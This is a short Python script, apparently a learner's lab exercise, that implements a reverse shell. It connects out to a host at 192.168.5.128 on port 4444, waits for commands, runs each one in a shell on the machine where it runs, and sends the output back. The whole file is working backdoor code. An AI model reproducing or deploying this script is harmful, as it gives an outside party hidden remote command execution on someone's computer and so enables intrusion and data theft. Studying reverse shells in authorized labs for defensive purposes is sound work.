#!/usr/bin/env python  
#Note that we are running this program on the Microsoft comp

import socket 
import subprocess

def execute_system_command(command): 
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
connection.connect(("192.168.5.128", 4444))  

x = "******[Connection Established]*****\n".encode("utf-8")
connection.send(x) 

#Now we want to receive data.  
while True: #this will allow us to run multiple commands
    command = connection.recv(1024).decode()
    command_result = execute_system_command(command)
    connection.send(command_result)

connection.close() 
